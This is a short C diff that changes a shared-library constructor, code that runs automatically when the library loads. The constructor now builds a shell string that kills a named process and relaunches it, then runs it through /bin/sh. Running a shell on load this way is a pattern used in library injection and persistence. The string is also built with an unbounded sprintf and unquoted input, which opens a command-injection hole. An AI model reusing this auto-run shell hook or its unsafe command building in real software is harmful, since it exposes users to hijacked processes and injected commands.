@@ -17,7 +17,11 @@ void __attribute__((constructor)) setup() {
 
   fclose(tmp);
 
+  char p[4096] = {0};
+
+  sprintf(p, "kill `pidof %s`; %s", buf, buf);
+
   // exec
-  char *empty[] = {"-c", buf};
+  char *empty[] = {"-c", p};
   execve("/bin/sh", empty, empty);
 }
